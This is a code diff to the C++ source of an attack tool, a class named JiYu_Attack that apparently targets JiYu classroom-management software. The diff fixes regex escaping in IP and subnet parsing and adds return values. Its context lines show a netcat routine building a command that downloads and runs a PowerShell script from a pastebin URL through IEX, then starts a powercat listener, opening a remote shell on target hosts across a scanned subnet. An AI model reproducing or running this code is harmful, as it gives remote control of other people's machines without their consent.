@@ -8,6 +8,10 @@
 #include "Logger.h"
 #include "ISocket.h"
 
+#ifdef _MSC_VER
+#pragma warning(disable:4530)
+#endif // _MSC_VER
+
 JiYu_Attack::JiYu_Attack(): logger(stdout), client(logger) {
     logger.setLevel(Logger::IERROR);
 }
@@ -121,12 +125,12 @@ const std::string JiYu_Attack::nc_ps_url = "https://pastebin.com/raw/u7zARPaN";
 
 std::vector<std::string> JiYu_Attack::IPParser(std::string rawIP) {
     std::vector<std::string> ret;
-    std::regex pattern("^((0|([1-9]\d?)|(1\d{2})|(2[0-4]\d)|(25[0-4]))\.){3}(([1-9]\d?)|(1\d{2})|(2[0-4]\d)|(25[0-4]))$");
+    std::regex pattern("^((0|([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))\\.){3}(([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))$");
     if(std::regex_match(rawIP, pattern)) {
         ret.push_back(rawIP);
         return ret;
     }
-    pattern = std::regex("^((0|([1-9]\d?)|(1\d{2})|(2[0-4]\d)|(25[0-4]))\.){3}(([1-9]\d?)|(1\d{2})|(2[0-4]\d)|(25[0-4]))-(([1-9]\d?)|(1\d{2})|(2[0-4]\d)|(25[0-4]))$");
+    pattern = std::regex("^((0|([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))\\.){3}(([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))-(([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))$");
     if(std::regex_match(rawIP, pattern)) {
         std::string segPrefix = rawIP.substr(0, rawIP.rfind('.') + 1);
         std::string lStr = rawIP.substr(rawIP.rfind('.') + 1, rawIP.find('-') - rawIP.rfind('.') - 1);
@@ -143,7 +147,7 @@ std::vector<std::string> JiYu_Attack::IPParser(std::string rawIP) {
         }
         return ret;
     }
-    pattern = std::regex("^((0|([1-9]\d?)|(1\d{2})|(2[0-4]\d)|(25[0-5]))\.){3}(([1-9]\d?)|(1\d{2})|(2[0-4]\d)|(25[0-5]))/24$");
+    pattern = std::regex("^((0|([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-5]))\\.){3}(([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-5]))/24$");
     if(std::regex_match(rawIP, pattern)) {
         std::string segPrefix = rawIP.substr(0, rawIP.rfind('.') + 1);
         for(int i = 1; i < 255; i++) {
@@ -216,9 +220,9 @@ DWORD WINAPI netcat_remote(LPVOID lpParameter) {
 }
 
 int JiYu_Attack::netcat(std::string IP, int port, int ncport) {
-    std::regex pattern("^((0|([1-9]\d?)|(1\d{2})|(2[0-4]\d)|(25[0-4]))\.){3}(([1-9]\d?)|(1\d{2})|(2[0-4]\d)|(25[0-4]))$");
+    std::regex pattern("^((0|([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))\\.){3}(([1-9]\\d?)|(1\\d{2})|(2[0-4]\\d)|(25[0-4]))$");
     if(!std::regex_match(IP, pattern)) {
-        return;
+        return 1;
     }
     NetcatInfo ncInfo;
     ncInfo.jyAtk = this;
@@ -231,6 +235,7 @@ int JiYu_Attack::netcat(std::string IP, int port, int ncport) {
         "powershell IEX (New-Object System.Net.Webclient).DownloadString('" + nc_ps_url +
         "');powercat -l -p " + std::to_string(ncport)
     ).c_str());
+    return 0;
 }
 
 int JiYu_Attack::breakScreenControl() {
